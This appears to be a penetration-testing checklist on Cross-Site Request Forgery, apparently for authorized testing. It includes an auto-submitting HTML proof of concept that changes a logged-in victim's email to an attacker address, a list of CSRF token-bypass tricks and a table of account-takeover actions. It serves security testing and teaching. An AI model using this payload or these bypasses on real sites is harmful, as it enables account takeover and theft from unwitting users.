---
title: "Cross-Site Request Forgery (CSRF)"
---

## What It Is

CSRF forces a victim's browser to perform an unwanted action on a site where they're authenticated. Impact depends on what action you can trigger.

## Where to Look

- Password / email change forms
- Account deletion
- Payment / transfer actions
- Settings changes
- Any state-changing POST/PUT/DELETE without anti-CSRF tokens

## Testing

```html
<!-- Basic CSRF PoC — host on your server, victim visits while logged in -->
<html>
<body>
<form action="https://<TARGET>/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="submit" value="Click me">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
```

## Token Bypass Techniques

```
# Remove the CSRF token entirely — does the server still accept it?

# Use an empty token value
csrf_token=

# Re-use another user's token — is it tied to the session?

# Change request method
POST → GET (some frameworks skip CSRF on GET)

# Change Content-Type
application/x-www-form-urlencoded → application/json
(JSON requests with simple Content-Type may bypass SameSite cookie checks)

# Subdomain token — if *.target.com is in scope, 
# XSS on sub.target.com → use to bypass SameSite
```

## High-Impact CSRF Actions

| Action | Why It Matters |
|--------|---------------|
| Change email + trigger password reset | Full account takeover |
| Change password (no current password required) | Account takeover |
| Add admin user / change role | Privilege escalation |
| Transfer funds | Financial impact |
| Delete account | Denial of service |
| Disable 2FA | Weakens account security |

## Findings

| Endpoint | Action | Token Status | Impact | Status |
|----------|--------|-------------|--------|--------|
| | | Missing/Bypassable | | |
